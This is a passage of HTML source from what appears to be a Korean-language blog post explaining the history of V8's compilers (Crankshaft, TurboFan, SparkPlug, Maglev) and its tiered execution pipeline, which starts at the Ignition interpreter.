href="#2-2-V8-&#xC5D4;&#xC9C4;-&#xC18C;&#xAC1C;" class="headerlink" title="2.2 V8 &#xC5D4;&#xC9C4; &#xC18C;&#xAC1C;"></a><strong>2.2 V8 &#xC5D4;&#xC9C4; &#xC18C;&#xAC1C;</strong></h3><p><img src="image%2011.png" alt="image.png"></p><p>V8&#xC774;&#xB77C;&#xB294; &#xC774;&#xB984;&#xC740; &#xACE0;&#xC131;&#xB2A5; &#xC790;&#xB3D9;&#xCC28; &#xC5D4;&#xC9C4;&#xC5D0;&#xC11C; &#xB530;&#xC628; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. Chrome &#xD300;&#xC740; &#xC790;&#xC2E0;&#xB4E4;&#xC774; &#xB9CC;&#xB4E0; JavaScript &#xC5D4;&#xC9C4;&#xC774; &#xB9C8;&#xCE58; V8 &#xC5D4;&#xC9C4;&#xCC98;&#xB7FC; &#xBE60;&#xB974;&#xACE0; &#xAC15;&#xB825;&#xD558;&#xAE38; &#xBC14;&#xB77C;&#xB294; &#xB9C8;&#xC74C;&#xC5D0;&#xC11C; &#xC774; &#xC774;&#xB984;&#xC744; &#xBD99;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC2E4;&#xC81C;&#xB85C; V8&#xC740; &#xB2E8;&#xC21C;&#xD55C; &#xC778;&#xD130;&#xD504;&#xB9AC;&#xD130;&#xAC00; &#xC544;&#xB2C8;&#xB77C;, &#xB2E4;&#xC591;&#xD55C; &#xCD5C;&#xC801;&#xD654; &#xAE30;&#xC220;&#xC774; &#xACB0;&#xD569;&#xB41C; &#xBCF5;&#xC7A1;&#xD558;&#xACE0; &#xC815;&#xAD50;&#xD55C; &#xC2E4;&#xD589; &#xC5D4;&#xC9C4;&#xC785;&#xB2C8;&#xB2E4;. </p><p>&#xC55E;&#xC5D0;&#xC11C;&#xB3C4; &#xC5B8;&#xAE09;&#xD588;&#xB4EF;&#xC774;, JavaScript&#xB294; <strong>&#xB3D9;&#xC801; &#xD0C0;&#xC774;&#xD551; &#xC5B8;&#xC5B4;</strong>&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC2E4;&#xD589; &#xC2DC;&#xC810;&#xAE4C;&#xC9C0; &#xBCC0;&#xC218;&#xC758; &#xD0C0;&#xC785;&#xC774;&#xB098; &#xAC1D;&#xCCB4;&#xC758; &#xAD6C;&#xC870;&#xB97C; &#xC815;&#xD655;&#xD788; &#xC54C; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xAC1C;&#xBC1C;&#xC790; &#xC785;&#xC7A5;&#xC5D0;&#xC11C; &#xB9E4;&#xC6B0; &#xC720;&#xC5F0;&#xD558;&#xACE0; &#xD3B8;&#xB9AC;&#xD558;&#xC9C0;&#xB9CC;, &#xC5D4;&#xC9C4; &#xC785;&#xC7A5;&#xC5D0;&#xC11C;&#xB294; &#xC131;&#xB2A5; &#xCD5C;&#xC801;&#xD654;&#xC640; &#xBCF4;&#xC548; &#xCE21;&#xBA74;&#xC5D0;&#xC11C; &#xB9E4;&#xC6B0; &#xD070; &#xB3C4;&#xC804; &#xACFC;&#xC81C;&#xAC00; &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xBB38;&#xC81C;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD574; V8&#xC740; &#xB2E4;&#xB2E8;&#xACC4; &#xC2E4;&#xD589; &#xD30C;&#xC774;&#xD504;&#xB77C;&#xC778;&#xC744; &#xB3C4;&#xC785;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCD08;&#xAE30;&#xC5D0;&#xB294; &#xBC14;&#xC774;&#xD2B8;&#xCF54;&#xB4DC; &#xC778;&#xD130;&#xD504;&#xB9AC;&#xD130; &#xC5C6;&#xC774;, &#xACE7;&#xBC14;&#xB85C; JIT &#xCD5C;&#xC801;&#xD654; &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xC778; <strong>Crankshaft</strong>&#xB97C; &#xC0AC;&#xC6A9;&#xD574; JavaScript &#xCF54;&#xB4DC;&#xB97C; &#xBE60;&#xB974;&#xAC8C; &#xBA38;&#xC2E0; &#xCF54;&#xB4DC;&#xB85C; &#xBCC0;&#xD658;&#xD588;&#xC9C0;&#xB9CC;, &#xC774;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xD55C;&#xACC4;&#xC5D0; &#xBD80;&#xB52A;&#xD614;&#xC2B5;&#xB2C8;&#xB2E4;:</p><ul><li>&#xBAA8;&#xB4E0; &#xCF54;&#xB4DC;&#xB97C; &#xCD5C;&#xC801;&#xD654;&#xD558;&#xB824;&#xB2E4; &#xBCF4;&#xB2C8; <strong>&#xBA54;&#xBAA8;&#xB9AC; &#xC0AC;&#xC6A9;&#xB7C9;&#xC774; &#xB9CE;&#xACE0; &#xC2DC;&#xC791; &#xC18D;&#xB3C4;&#xAC00; &#xB290;&#xB9BC;</strong></li><li><strong>&#xB3D9;&#xC801; &#xC5B8;&#xC5B4; &#xD2B9;&#xC131;&#xC0C1; &#xCD5C;&#xC801;&#xD654; &#xC2E4;&#xD328; &#xAC00;&#xB2A5;&#xC131;</strong>&#xC774; &#xB192;&#xACE0;, &#xC774;&#xB97C; &#xBCF5;&#xAD6C;(deopt)&#xD558;&#xB294; &#xBE44;&#xC6A9;&#xB3C4; &#xD07C;</li><li><strong>ECMAScript &#xD45C;&#xC900; &#xBC1C;&#xC804;</strong>&#xC5D0; &#xB530;&#xB978; &#xC0C8;&#xB85C;&#xC6B4; &#xBB38;&#xBC95; &#xC9C0;&#xC6D0;&#xC774; &#xC5B4;&#xB824;&#xC6C0;</li></ul><p>&#xC774;&#xB7EC;&#xD55C; &#xC774;&#xC720;&#xB85C; Crankshaft&#xB294; <strong>&#xC720;&#xC9C0; &#xBCF4;&#xC218;&#xAC00; &#xC5B4;&#xB824;&#xC6B4; &#xAD6C;&#xC870;</strong>&#xAC00; &#xB418;&#xC5C8;&#xACE0;, V8 &#xD300;&#xC740; &#xC774;&#xB97C; &#xB300;&#xCCB4;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC0C8;&#xB85C;&#xC6B4; &#xCEF4;&#xD30C;&#xC77C;&#xB7EC; &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xB97C; &#xC124;&#xACC4;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8; &#xACB0;&#xACFC;&#xB85C; &#xB4F1;&#xC7A5;&#xD55C; &#xAC83;&#xC774; &#xBC14;&#xB85C; <strong>TurboFan</strong>&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="image%2012.png" alt="image.png"></p><p><strong>TurboFan&#xC758; &#xB4F1;&#xC7A5; (v5.9 &#xC774;&#xD6C4;)</strong></p><p>TurboFan&#xC740; Crankshaft&#xB97C; &#xB300;&#xCCB4;&#xD558;&#xB294; &#xACE0;&#xAE09; &#xCD5C;&#xC801;&#xD654; &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xB85C;, &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xCCA0;&#xD559;&#xC744; &#xBC14;&#xD0D5;&#xC73C;&#xB85C; &#xAC1C;&#xBC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;:</p><ul><li>&#xC804;&#xCCB4; JavaScript &#xC5B8;&#xC5B4; &#xC2A4;&#xD399;&#xC744; &#xC9C0;&#xC6D0;</li><li>&#xC911;&#xAC04; &#xD45C;&#xD604;(IR)&#xC744; &#xC911;&#xC2EC;&#xC73C;&#xB85C; &#xBD84;&#xC11D;&#xACFC; &#xCD5C;&#xC801;&#xD654;&#xB97C; &#xCCB4;&#xACC4;&#xD654;</li><li>&#xB2E4;&#xC591;&#xD55C; &#xD50C;&#xB7AB;&#xD3FC;&#xACFC; &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xC5D0; &#xB300;&#xD574; &#xD655;&#xC7A5;&#xC131;&#xACFC; &#xC774;&#xC2DD;&#xC131; &#xD655;&#xBCF4;</li></ul><p>TurboFan&#xC740; &#xAC15;&#xB825;&#xD55C; &#xCD5C;&#xC801;&#xD654; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xACF5;&#xD588;&#xC9C0;&#xB9CC;, &#xC5EC;&#xC804;&#xD788; &#xCD5C;&#xC801;&#xD654;&#xAE4C;&#xC9C0; &#xB3C4;&#xB2EC;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xC2DC;&#xAC04;&#xACFC; &#xBE44;&#xC6A9;&#xC774; &#xBB38;&#xC81C;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788; &#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xC5D0;&#xC11C; &#xC218;&#xB9CE;&#xC740; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xAC00; &#xC9E7;&#xAC8C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xACBD;&#xC6B0;, TurboFan&#xC740; &#xACFC;&#xD55C; &#xBB34;&#xAE30;&#xC600;&#xB358; &#xC148;&#xC785;&#xB2C8;&#xB2E4;.</p><p><strong>SparkPlug&#xC758; &#xB3C4;&#xC785; (2021)</strong></p><p>&#xC774; &#xBB38;&#xC81C;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD574;, V8 &#xD300;&#xC740; <strong>&#xC911;&#xAC04; &#xB2E8;&#xACC4;&#xC758; &#xACBD;&#xB7C9; JIT &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xC778; SparkPlug</strong>&#xB97C; &#xB3C4;&#xC785;&#xD569;&#xB2C8;&#xB2E4;. SparkPlug&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xBAA9;&#xD45C;&#xB85C; &#xC124;&#xACC4;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;:</p><ul><li>&#xBC14;&#xC774;&#xD2B8;&#xCF54;&#xB4DC;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xD558;&#xC5EC;, &#xC774;&#xBBF8; &#xD574;&#xC11D;&#xB41C; &#xCF54;&#xB4DC;&#xB97C; &#xBE60;&#xB974;&#xAC8C; &#xCEF4;&#xD30C;&#xC77C;</li><li>&#xD0C0;&#xC785; &#xBD84;&#xC11D;&#xC774;&#xB098; &#xBCF5;&#xC7A1;&#xD55C; &#xCD5C;&#xC801;&#xD654;&#xB97C; &#xC0DD;&#xB7B5;&#xD558;&#xACE0;, &#xBE60;&#xB978; &#xCF54;&#xB4DC; &#xC0DD;&#xC131;&#xC744; &#xC6B0;&#xC120;&#xC2DC;</li><li>TurboFan&#xBCF4;&#xB2E4; &#xBE60;&#xB974;&#xC9C0;&#xB9CC; &#xB35C; &#xCD5C;&#xC801;&#xD654;&#xB41C; &#xBA38;&#xC2E0; &#xCF54;&#xB4DC;&#xB97C; &#xC0DD;&#xC131;</li></ul><p>SparkPlug&#xB294; Ignition &#xC778;&#xD130;&#xD504;&#xB9AC;&#xD130;&#xBCF4;&#xB2E4; &#xBE60;&#xB974;&#xACE0;, TurboFan&#xBCF4;&#xB2E4; &#xAC00;&#xBCBC;&#xC6B4; &#xC2E4;&#xD589;&#xC744; &#xC81C;&#xACF5;&#xD568;&#xC73C;&#xB85C;&#xC368;, JavaScript &#xC2E4;&#xD589;&#xC758; &#xCD08;&#xAE30; &#xB2E8;&#xACC4;&#xC5D0;&#xC11C; &#xD070; &#xD6A8;&#xC728;&#xC744; &#xAC00;&#xC838;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788; &#xD398;&#xC774;&#xC9C0; &#xB85C;&#xB529;&#xC774;&#xB098; &#xCD08;&#xAE30; &#xC0AC;&#xC6A9;&#xC790; &#xC0C1;&#xD638;&#xC791;&#xC6A9;&#xC5D0; &#xD070; &#xB3C4;&#xC6C0;&#xC774; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><strong>Maglev&#xC758; &#xCD94;&#xAC00; (2022~)</strong></p><p>SparkPlug&#xC758; &#xC131;&#xB2A5;&#xC740; &#xB098;&#xC058;&#xC9C0; &#xC54A;&#xC558;&#xC9C0;&#xB9CC;, &#xC5EC;&#xC804;&#xD788; &#xC911;&#xAC04;&#xAE09; &#xC131;&#xB2A5;&#xACFC; &#xB0AE;&#xC740; &#xCD5C;&#xC801;&#xD654; &#xC218;&#xC900;&#xC5D0; &#xBA38;&#xBB34;&#xB294; &#xD55C;&#xACC4;&#xAC00; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. V8 &#xD300;&#xC740; SparkPlug&#xC640; TurboFan &#xC0AC;&#xC774;&#xC5D0; &#xB354; &#xBE60;&#xB974;&#xBA74;&#xC11C;&#xB3C4; &#xB354; &#xB611;&#xB611;&#xD55C; &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xB97C; &#xC6D0;&#xD588;&#xACE0;, &#xADF8;&#xB807;&#xAC8C; &#xB4F1;&#xC7A5;&#xD55C; &#xAC83;&#xC774; &#xBC14;&#xB85C; Maglev&#xC785;&#xB2C8;&#xB2E4;.</p><p>Maglev&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xAE30;&#xC220;&#xC801; &#xC774;&#xC720;&#xB85C; &#xAC1C;&#xBC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;:</p><ul><li>SparkPlug&#xBCF4;&#xB2E4; &#xB354; aggressive&#xD55C; &#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xAE30;&#xBC18; &#xCF54;&#xB4DC; &#xC0DD;&#xC131;</li><li>&#xD0C0;&#xC785; &#xD53C;&#xB4DC;&#xBC31;&#xC744; &#xC5B4;&#xB290; &#xC815;&#xB3C4; &#xBC18;&#xC601;&#xD558;&#xC5EC; &#xCD5C;&#xC801;&#xD654;&#xB41C; &#xCF54;&#xB4DC; &#xC0DD;&#xC131;</li><li>&#xCEF4;&#xD30C;&#xC77C; &#xC18D;&#xB3C4;&#xB294; SparkPlug&#xC640; &#xBE44;&#xC2B7;&#xD558;&#xC9C0;&#xB9CC;, &#xC2E4;&#xD589; &#xC131;&#xB2A5;&#xC740; TurboFan&#xC5D0; &#xADFC;&#xC811;</li></ul><p>Maglev&#xB294; &#xBAA8;&#xBC14;&#xC77C;&#xACFC; &#xAC19;&#xC774; &#xB9AC;&#xC18C;&#xC2A4;&#xAC00; &#xC81C;&#xD55C;&#xB41C; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xC131;&#xB2A5; &#xCD5C;&#xC801;&#xD654;&#xAC00; &#xD544;&#xC694;&#xD55C; &#xACBD;&#xC6B0; &#xD2B9;&#xD788; &#xC720;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C;, Tiering &#xAD6C;&#xC870;&#xC5D0;&#xC11C; Ignition &#x2192; Maglev &#x2192; TurboFan&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9C0;&#xB294; &#xACC4;&#xCE35;&#xC801; &#xC2E4;&#xD589; &#xBAA8;&#xB378;&#xC744; &#xAD6C;&#xCD95;&#xD558;&#xC5EC;, &#xCF54;&#xB4DC;&#xC758; &#x201C;&#xD56B;&#xD568;&#x201D;(hot code)&#xC5D0; &#xB530;&#xB77C; &#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xCD5C;&#xC801;&#xD654; &#xC218;&#xC900;&#xC744; &#xC870;&#xC808;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="2-3-V8-&#xC2E4;&#xD589;-&#xD30C;&#xC774;&#xD504;&#xB77C;&#xC778;-&#xAD6C;&#xC870;"><a href="#2-3-V8-&#xC2E4;&#xD589;-&#xD30C;&#xC774;&#xD504;&#xB77C;&#xC778;-&#xAD6C;&#xC870;" class="headerlink" title="2.3 V8 &#xC2E4;&#xD589; &#xD30C;&#xC774;&#xD504;&#xB77C;&#xC778; &#xAD6C;&#xC870;"></a>2.3 V8 &#xC2E4;&#xD589; &#xD30C;&#xC774;&#xD504;&#xB77C;&#xC778; &#xAD6C;&#xC870;</h3><p>&#xC704; &#xB0B4;&#xC6A9;&#xC744; &#xD1A0;&#xB300;&#xB85C; V8 &#xC2E4;&#xD589; &#xD30C;&#xC774;&#xD504;&#xB77C;&#xC778; &#xAD6C;&#xC870;&#xB97C; &#xC815;&#xB9AC;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image%2013.png" alt="image.png"></p><p>&#xAC00;&#xC7A5; &#xBA3C;&#xC800; &#xB4F1;&#xC7A5;&#xD558;&#xB294; &#xAC83;&#xC740; <strong>Ignition &#xC778;&#xD130;&#xD504;&#xB9AC;&#xD130;</strong>&#xC785;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C;&#xB294; &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xC18C;&#xC2A4;&#xB97C; &#xBC14;&#xC774;&#xD2B8;&#xCF54;&#xB4DC;&#xB85C; &#xBCC0;&#xD658;&#xD558;&#xACE0;, &#xC21C;&#xCC28;&#xC801;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xD558;&#xBA74;&#xC11C; &#xB7F0;&#xD0C0;&#xC784; &#xC815;&#xBCF4;&#xB97C; &#xC218;&#xC9D1;&#xD569;&#xB2C8;&#xB2E4;. Ignition&#xC740; &#xBE60;&#xB978; &#xC2DC;&#xC791;&#xACFC; &#xB0AE;&#xC740; &#xBA54;&#xBAA8;&#xB9AC; &#xC18C;&#xBE44;&#xB97C; &#xBAA9;&#xD45C;&#xB85C; &#xC124;&#xACC4;&#xB418;&#xC5C8;&#xC73C;&#xBA70;, &#xD06C;&#xB86C; v5.9&#xC5D0;&#xC11C; &#xAE30;&#xC874;&#xC758; Full-codegen&#xC744; &#xB300;&#xCCB4;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC778;&#xD130;&#xD504;&#xB9AC;&#xD130;&#xB9CC;&#xC73C;&#xB85C;&#xB294; &#xACE0;&#xC131;&#xB2A5;&#xC744; &#xAE30;&#xB300;&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xC77C;&#xC815; &#xAE30;&#xC900;&#xC744; &#xB118;&#xB294; &#x201C;&#xD56B; &#xCF54;&#xB4DC;(hot code)&#x201D;&#xB294; &#xC774;&#xD6C4; JIT &#xCEF4;&#xD30C;&#xC77C;&#xB7EC; &#xB2E8;&#xACC4;&#xB85C; &#xC9C4;&#xC785;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB54C; &#xB4F1;&#xC7A5;&#xD558;&#xB294; &#xAC83;&#xC774; &#xBC14;&#xB85C; <strong>SparkPlug</strong>&#xC785;&#xB2C8;&#xB2E4;. SparkPlug&#xB294; &#xBC14;&#xC774;&#xD2B8;&#xCF54;&#xB4DC;&#xB97C; &#xD574;&#xC11D;&#xD55C; &#xACB0;&#xACFC;&#xB97C; &#xBC14;&#xD0D5;&#xC73C;&#xB85C;, &#xBCF5;&#xC7A1;&#xD55C; &#xD0C0;&#xC785; &#xBD84;&#xC11D;&#xC774;&#xB098; &#xCD5C;&#xC801;&#xD654; &#xC5C6;&#xC774; <strong>&#xBE60;&#xB974;&#xAC8C; &#xB124;&#xC774;&#xD2F0;&#xBE0C; &#xCF54;&#xB4DC;&#xB85C; &#xCEF4;&#xD30C;&#xC77C;</strong>&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xC2E4;&#xD589; &#xC18D;&#xB3C4;&#xB97C; &#xB192;&#xC774;&#xACE0;, &#xB3D9;&#xC2DC;&#xC5D0; CPU &#xC790;&#xC6D0;&#xACFC; &#xBA54;&#xBAA8;&#xB9AC; &#xC0AC;&#xC6A9;&#xB7C9;&#xB3C4; &#xC808;&#xC57D;&#xD560; &#xC218; &#xC788;&#xB294; &#xD6A8;&#xC728;&#xC801;&#xC778; &#xC911;&#xAC04; &#xB2E8;&#xACC4;&#xC785;&#xB2C8;&#xB2E4;. SparkPlug&#xB294; &#xD398;&#xC774;&#xC9C0; &#xB85C;&#xB529;&#xCC98;&#xB7FC; &#xBE60;&#xB978; &#xBC18;&#xC751;&#xC774; &#xD544;&#xC694;&#xD55C; &#xC2DC;&#xC810;&#xC5D0;&#xC11C; <strong>&#xAC00;&#xBCCD;&#xACE0; &#xC989;&#xAC01;&#xC801;&#xC778; &#xC2E4;&#xD589; &#xC131;&#xB2A5;&#xC744; &#xD655;&#xBCF4;&#xD558;&#xB294; &#xB370; &#xCD5C;&#xC801;&#xD654;</strong>&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD558;&#xC9C0;&#xB9CC; &#xB54C;&#xB85C;&#xB294; &#xB354; &#xB192;&#xC740; &#xCD5C;&#xC801;&#xD654;&#xAC00; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xB4F1;&#xC7A5;&#xD558;&#xB294; &#xAC83;&#xC774; V8&#xC758; &#xACE0;&#xC131;&#xB2A5; &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xC778; <strong>TurboFan</strong>&#xC785;&#xB2C8;&#xB2E4;. TurboFan&#xC740; Ignition&#xC774;&#xB098; SparkPlug &#xB2E8;&#xACC4;&#xC5D0;&#xC11C; &#xC218;&#xC9D1;&#xB41C; <strong>&#xD0C0;&#xC785; &#xD53C;&#xB4DC;&#xBC31;, &#xD638;&#xCD9C; &#xD328;&#xD134;, &#xB8E8;&#xD504; &#xAD6C;&#xC870;</strong> &#xB4F1;&#xC758; &#xC815;&#xBCF4;&#xB97C; &#xD65C;&#xC6A9;&#xD574;, &#xACE0;&#xAE09; &#xCD5C;&#xC801;&#xD654;&#xB97C; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xD568;&#xC218; &#xC778;&#xB77C;&#xC774;&#xB2DD;, &#xB8E8;&#xD504; &#xC804;&#xAC1C;, &#xD0C0;&#xC785; &#xD2B9;&#xD654; &#xB4F1; &#xB2E4;&#xC591;&#xD55C; &#xAE30;&#xBC95;&#xC744; &#xC801;&#xC6A9;&#xD558;&#xC5EC;, <strong>&#xC815;&#xC801;&#xC73C;&#xB85C; &#xC791;&#xC131;&#xB41C; &#xC5B8;&#xC5B4; &#xBABB;&#xC9C0;&#xC54A;&#xC740; &#xC131;&#xB2A5;&#xC758; &#xBA38;&#xC2E0; &#xCF54;&#xB4DC;&#xB97C; &#xC0DD;&#xC131;</strong>&#xD569;&#xB2C8;&#xB2E4;. &#xD55C; &#xBC88; &#xCD5C;&#xC801;&#xD654;&#xB41C; &#xCF54;&#xB4DC;&#xB294; &#xCE90;&#xC2DC;&#xB418;&#xC5B4; &#xC774;&#xD6C4; &#xD638;&#xCD9C; &#xC2DC; &#xBE60;&#xB974;&#xAC8C; &#xC2E4;&#xD589;&#xB418;&#xBBC0;&#xB85C;, &#xBC18;&#xBCF5;&#xC801;&#xC73C;&#xB85C; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; TurboFan&#xC758; &#xD6A8;&#xACFC;&#xAC00; &#xB9E4;&#xC6B0; &#xD07D;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7F0;&#xB370; TurboFan&#xC740; &#xC131;&#xB2A5;&#xC740; &#xB6F0;&#xC5B4;&#xB098;&#xC9C0;&#xB9CC; &#xCEF4;&#xD30C;&#xC77C; &#xBE44;&#xC6A9;&#xC774; &#xD06C;&#xACE0;, &#xCD5C;&#xC801;&#xD654;&#xAC00; &#xC2E4;&#xD328;(deopt)&#xD560; &#xACBD;&#xC6B0; &#xC624;&#xD788;&#xB824; &#xC131;&#xB2A5;&#xC774; &#xC800;&#xD558;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xBCF4;&#xC644;&#xD558;&#xAE30; &#xC704;&#xD574; &#xB4F1;&#xC7A5;&#xD55C; &#xAC83;&#xC774; <strong>Maglev</strong>&#xC785;&#xB2C8;&#xB2E4;. Maglev&#xB294; <strong>SparkPlug&#xC640; TurboFan &#xC0AC;&#xC774;&#xC758; &#xC131;&#xB2A5;-&#xCEF4;&#xD30C;&#xC77C; &#xC2DC;&#xAC04; &#xADE0;&#xD615;&#xC744; &#xB9DE;&#xCD94;&#xAE30; &#xC704;&#xD574; &#xC124;&#xACC4;&#xB41C; &#xCD5C;&#xC2E0; JIT &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;</strong>&#xC785;&#xB2C8;&#xB2E4;. SparkPlug&#xBCF4;&#xB2E4; &#xB354; &#xC815;&#xAD50;&#xD558;&#xAC8C; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB97C; &#xB2E4;&#xB8E8;&#xBA70;, &#xBD80;&#xBD84;&#xC801;&#xC778; &#xD0C0;&#xC785; &#xC815;&#xBCF4;&#xB97C; &#xD65C;&#xC6A9;&#xD55C; &#xCD5C;&#xC801;&#xD654;&#xB97C; &#xC218;&#xD589;&#xD558;&#xC9C0;&#xB9CC;, TurboFan&#xB9CC;&#xD07C; &#xBB34;&#xAC81;&#xC9C0;&#xB294; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. 2022&#xB144;&#xBD80;&#xD130; &#xC810;&#xC9C4;&#xC801;&#xC73C;&#xB85C; &#xB3C4;&#xC785;&#xB41C; Maglev&#xB294; &#xD2B9;&#xD788; <strong>&#xBAA8;&#xBC14;&#xC77C;&#xACFC; &#xAC19;&#xC774; &#xC790;&#xC6D0;&#xC774; &#xC81C;&#xD55C;&#xB41C; &#xD658;&#xACBD;</strong>&#xC5D0;&#xC11C; &#xD0C1;&#xC6D4;&#xD55C; &#xC131;&#xB2A5;&#xC744; &#xBC1C;&#xD718;&#xD558;&#xBA70;, &#xB2E4;&#xC591;&#xD55C; &#xC2E4;&#xD589; &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xC5D0; &#xC720;&#xC5F0;&#xD558;&#xAC8C; &#xB300;&#xC751;&#xD560; &#xC218; &#xC788;&#xB294; &#xC0C8;&#xB85C;&#xC6B4; &#xC911;&#xAC04; &#xACC4;&#xCE35;&#xC744; &#xD615;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image%2014.png" alt="image.png"></p><p>&#xC694;&#xC57D;&#xD558;&#xC790;&#xBA74;, V8&#xC758; &#xC2E4;&#xD589; &#xD30C;&#xC774;&#xD504;&#xB77C;&#xC778;&#xC740; &#xB2E8;&#xC77C;&#xD55C; JIT &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xAC00; &#xC544;&#xB2CC;, <strong>&#xC0C1;&#xD669;&#xC5D0; &#xB530;&#xB77C; &#xB2E4;&#xB978; &#xC804;&#xB7B5;&#xC744; &#xC120;&#xD0DD;&#xD560; &#xC218; &#xC788;&#xB294; &#xC720;&#xC5F0;&#xD55C; &#xAD6C;&#xC870;</strong>&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC838; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xB54C; &#xCC98;&#xC74C;&#xBD80;&#xD130; &#xBAA8;&#xB4E0; &#xBE44;&#xC6A9;&#xC744; &#xB4E4;&#xC774;&#xC9C0; &#xC54A;&#xACE0;, &#xD544;&#xC694;&#xD55C; &#xB9CC;&#xD07C;&#xB9CC; &#xD22C;&#xC790;&#xD558;&#xBA74;&#xC11C; &#xC810;&#xC810; &#xC131;&#xB2A5;&#xC744; &#xB04C;&#xC5B4;&#xC62C;&#xB9AC;&#xB294; &#xAD6C;&#xC870;&#xC8E0;. &#xC774; &#xACC4;&#xCE35;&#xD654;&#xB41C; &#xC2E4;&#xD589; &#xCCB4;&#xACC4; &#xB355;&#xBD84;&#xC5D0; V8&#xC740; <strong>&#xBE60;&#xB978; &#xC2DC;&#xC791;, &#xB0AE;&#xC740; &#xBA54;&#xBAA8;&#xB9AC; &#xC18C;&#xBE44;, &#xB192;&#xC740; &#xC2E4;&#xD589; &#xC131;&#xB2A5;</strong>&#xC774;&#xB77C;&#xB294; &#xC138; &#xB9C8;&#xB9AC; &#xD1A0;&#xB07C;&#xB97C; &#xB3D9;&#xC2DC;&#xC5D0; &#xC7A1;&#xC744; &#xC218; &#xC788;&#xAC8C; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><hr><p>&#xC774; &#xAD6C;&#xC870; &#xB355;&#xBD84;&#xC5D0; JavaScript&#xB294; &#xC778;&#xD130;&#xD504;&#xB9AC;&#xD130; &#xC5B8;&#xC5B4;&#xC784;&#xC5D0;&#xB3C4; &#xBD88;&#xAD6C;&#xD558;&#xACE0; &#xB124;&#xC774;&#xD2F0;&#xBE0C; &#xC218;&#xC900;&#xC5D0; &#xAC00;&#xAE4C;&#xC6B4; &#xC131;&#xB2A5;&#xC744; &#xB0BC; &#xC218; &#xC788;&#xAC8C; &#xB418;&#xC5C8;&#xC73C;&#xBA70;, &#xAC1C;&#xBC1C;&#xC790;&#xB294; &#xBCC4;&#xB3C4;&#xC758; 